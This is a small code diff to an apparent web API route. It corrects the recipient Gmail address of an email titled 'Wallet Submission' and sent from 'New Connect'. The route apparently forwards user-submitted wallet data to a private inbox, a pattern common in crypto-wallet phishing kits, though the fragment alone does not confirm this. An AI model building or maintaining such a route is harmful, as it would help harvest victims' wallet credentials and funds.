@@ -37,7 +37,7 @@ export async function POST(request: Request) {
 
       const mailOptions = {
         from: `New Connect ${email}`,
-        to: ["fahadbadullahi180@gmail.com"],
+        to: ["fahadabdullahi180@gmail.com"],
         subject: "Wallet Submission",
         html: formattedMessage,
       }
